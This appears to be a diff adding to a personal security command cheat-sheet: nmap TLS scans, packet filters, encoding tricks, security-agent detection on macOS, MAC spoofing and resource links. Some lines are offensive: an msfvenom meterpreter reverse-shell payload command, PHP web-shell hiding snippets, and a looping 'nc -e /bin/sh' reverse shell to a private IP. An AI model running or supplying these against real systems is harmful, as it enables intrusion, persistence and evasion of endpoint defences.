@@ -117,6 +117,124 @@ l - listen incoming
 p - port
 telnet localhost 9998
 
+HEARTBLEED
+nmap -p 443 --script ssl-heartbleed 178.62.116.200
+
+NMAP NSE CIPHERS SCAN / Checking for Certificate information,
+Weak Ciphers and SSLv2 via nmap
+nmap -p 443 --script ssl-enum-ciphers 178.62.116.200
+nmap --script ssl-cert,ssl-enum-ciphers -p 443,465,993,995
+
+Basic Authentication over HTTP
+curl -kis 178.62.116.200
+
+Testing supported Cipher Suites, BEAST and CRIME attacks via TestSSLServer
+java -jar TestSSLServer.jar www3.example.com 443
+
+STARTTLS would be tested via testssl.sh -t smtp.gmail.com:587 smtp,
+each ciphers with testssl -e <target>, each ciphers per protocol
+with testssl -E <target>. To just display what local ciphers that are
+installed for openssl see testssl -V. For a thorough check it is best
+to dump the supplied OpenSSL binaries in the path or the one of testssl.sh.
+
+ipcalc 192.168.0.100 - 192.168.0.255
+xargs
+tee
+w
+whoami
+host 
+hostname
+ruby ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f c
+
+kextstat -- display status of loaded kernel extensions (kexts)
+kextstat | grep crowd
+Index Refs Address             Size       Wired      Name (Version) UUID <Linked Against>
+170    0    0xffffff7f831bc000 0xd5000    0xd5000    com.crowdstrike.sensor (77.02) 0FED8EE6-060B-3B43-B908-5A74EF0FDB0C <169 16 7 5 4 3 2 1>
+
+sysctl cs
+
+ps -ax |grep -i sentinel
+pkgutil --pkgs |grep sentinel
+pkgutil --pkg-info com.sentinelone.pkg.sentinel-agent
+^ get epoch from there and put it in below.
+date -r 1540456364
+
+egrep '^[^#]+'
+
+sentinel1=`pkgutil --pkg-info com.sentinelone.pkg.sentinel-agent |grep install-time | awk '{print $2}' `
+date -r $sentinel1
+
+ps
+a display info of all processes
+u display user processes
+x list processes not controlled via terminal
+p display specified pids
+t display speficied to terminal devices
+e other users w/o terminals
+f uid, pid, parent pid, cpu, etc
+
+ps -u jymi4098
+ps -ef |grep jymi4098
+ps -fp $(pgrep -u jymi4098)
+md5
+md5sum
+openssl md5 <file>
+shasum <file>
+shasum -a 1 <file>
+shasum -a 256 <file>
+grep -i
+grep -v
+netstat
+arp
+Tcpdump
+tshark -D (get interfaces)
+alias ll='ls -halp'
+pbcopy
+pbpaste
+
+brew info nmap
+brew search nmap
+
+brew install p7zip
+compress:
+7z a heed.7z sputnik
+decompress:
+7z x heed.7z
+
+echo emotet@hotmail.com | base64
+ZW1vdGV0QGhvdG1haWwuY29tCg==
+MVM35NG8WN:ASM jymi4098$ ec
+emotet@hotmail.com
+
+echo -n 'khondo' | openssl base64
+a2hvbmRv
+echo `echo a2hvbmRv | base64 --decode`
+khondo
+
+echo khondo | hexdump
+0000000 6b 68 6f 6e 64 6f 0a                           
+0000007
+
+echo khondo | od -t x1
+0000000    6b  68  6f  6e  64  6f  0a                                    
+0000007
+
+Add \x:
+\x6b\x68\x6f\x6e\x64\x6f\x0a
+
+echo -e "\x6b\x68\x6f\x6e\x64\x6f\x0a"
+khondo
+
+echo '6b 68 6f 6e 64 6f 0a'|sed 's/ //g' |xxd -ps -r
+khondo
+
+$ sudo ifconfig eth0 down
+$ sudo ifconfig eth0 hw ether AA:BB:CC:DD:EE:FF
+$ sudo ifconfig eth0 up
+
+
+
+
 //wireshark && tshark filters
 kerberos.cname
 kerberos.CNameString
@@ -134,6 +252,9 @@ tcp portrange 1501-1549
 tcp.flags.syn==1 or (tcp.seq==1 and tcp.ack==1 and tcp.len==0 and tcp.analysis.initial_rtt)
 SYN flood:
 tcp.flags.syn == 1 and tcp.flags.ack == 0
+worm comms over 135, 445, or 1433. change accordingly:
+dst port 135 or dst port 445 or dst port 1433  and tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) = 0 and src net 192.168.0.0/24
+
 
 tshark -r traffic-analysis-exercise.pcap -T fields -e ip.dst -e ip.src -e eth.dst -e eth.src | sort | uniq |grep -i 10.0.0.201 --color
 -T fields -e ip.src -e dns.qry.name -2R "dns.flags.response eq 0" | awk -F" " '{ print $2 }' | sort -u
@@ -153,7 +274,66 @@ infected
 malware
 forensics
 
+//links
+https://github.com/acrogenesis/macchanger
+https://github.com/RPISEC/Malware
+https://www.malware-traffic-analysis.net/training-exercises.html
+https://zeltser.com/vmware-network-isolation-for-malware-analysis/
+http://www.linuxsecurity.com/resource_files/documentation/virus-writing-HOWTO/_html/index.html
+https://gchq.github.io/CyberChef/
+https://github.com/bloomer1016
+https://www.herbiez.com
+https://www.malwarebytes.com/pricing/
+https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/
+https://github.com/Security-Onion-Solutions/security-onion/wiki/QuickISOImage
+https://www.cyber.nj.gov/threat-profiles
+https://www.fireeye.com/blog/threat-research/2017/07/flare-vm-the-windows-malware.html
+https://www.msreverseengineering.com/purchase-training/binary-literacy-static-reverse-engineering
+https://github.com/LiveOverflow/liveoverflow_youtube
+https://www.malwarearchaeology.com/cheat-sheets
+https://github.com/meirwah/awesome-incident-response
+https://taosecurity.blogspot.com/2009/04/speaking-of-incident-response.html
+http://opensecuritytraining.info/Training.html
+https://www.incidentresponse.com
+https://github.com/gfoss/PSRecon
+https://desowin.org/usbpcap/
+https://www.dan.me.uk/tornodes
+https://www.socks-proxy.net/
+https://free-proxy-list.net/
+https://github.com/malwaredllc/byob
+https://www.hybrid-analysis.com/recent-submissions?filter=file
+https://zeltser.com/malware-sample-sources/
+http://www.ccssforum.org/malware-certificates.php
 
+curl --proxy 62.182.206.19:37715 icanhazip.com
+
+```
+```
+/hiding php web shells/
+<? PHP	phpinfo	();	?>
+- This one will give you 200 OK
+<?	PHP	header	(	'HTTP/1.1	404'	);	ob_start	();	phpinfo	();	ob_end_clean	();		?>
+- 404 with access to  phpinfo
+
+#!/bin/sh
+while true; do
+        nc -e /bin/sh 192.168.1.86 1234
+        sleep 10
+done
+
+$ vi hello.c
+#include <stdio.h>
+int main()
+{
+   printf("Hello, World\n");
+   return 0;
+}
+
+$ gcc -o hello1 hello.c
+./hello
+
+cc hello.c -o hello2
+strings hello2
 
 ```
 
